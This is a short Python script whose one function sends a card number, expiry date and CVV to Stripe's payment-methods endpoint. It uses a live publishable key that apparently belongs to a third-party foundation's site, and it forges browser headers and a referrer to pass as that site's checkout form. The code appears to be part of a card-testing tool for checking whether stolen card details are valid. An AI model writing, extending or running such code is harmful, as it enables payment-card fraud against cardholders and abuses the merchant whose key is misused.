import requests
def extractpm(cnn, month, year, cvv):
   # print(cnn, month, year, cvv)
    url = "https://api.stripe.com/v1/payment_methods"
    
    payload = f"type=card&card%5Bnumber%5D={cnn}&card%5Bcvc%5D={cvv}&card%5Bexp_month%5D={month}&card%5Bexp_year%5D={year}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Ffondazioneippocrate.org&time_on_page=45221&key=pk_live_51OuvliFYNX7VcUOqExbhpEs1oBhdFkXg5kEopduw06jggY4yoSyFg1ZWgaZvXMEfU97PO7s3RUBZVMoHXr98XeBo00meOy4E4g"
    
    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      'Accept': "application/json",
      'authority': "api.stripe.com",
      'accept-language': "en-US,en;q=0.9",
      'origin': "https://js.stripe.com",
      'referer': "https://js.stripe.com/",
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'sec-ch-ua-mobile': "?1",
      'sec-ch-ua-platform': "\"Android\"",
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "same-site"
    }
    
    response = requests.post(url, data=payload, headers=headers)
    
    try:
        pm = response.json()['id']
        #}print(response)
        return pm
    except (KeyError, ValueError, Exception):
        return None
        
